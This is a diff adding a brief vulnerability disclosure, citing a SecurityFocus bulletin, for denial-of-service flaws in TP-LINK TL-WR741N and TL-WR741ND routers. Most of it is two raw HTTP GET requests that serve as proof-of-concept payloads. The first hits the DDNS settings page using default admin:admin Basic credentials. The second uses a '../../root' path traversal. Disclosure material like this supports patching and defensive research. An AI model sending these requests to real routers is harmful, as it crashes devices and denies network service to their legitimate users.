@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/59325/info
+
+TP-LINK TL-WR741N and TL-WR741ND routers are prone to multiple denial-of-service vulnerabilities when handling specially crafted HTTP requests.
+
+Successful exploits will cause the device to crash, denying service to legitimate users. 
+
+GET http://www.example.com:80/userRpm/DdnsAddRpm.htm?provider=4 HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/userRpm/DdnsAddRpm.htm?provider=4
+Authorization: Basic YWRtaW46YWRtaW4=
+
+
+
+GET http://www.example.com:80/help/../../root HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/help/
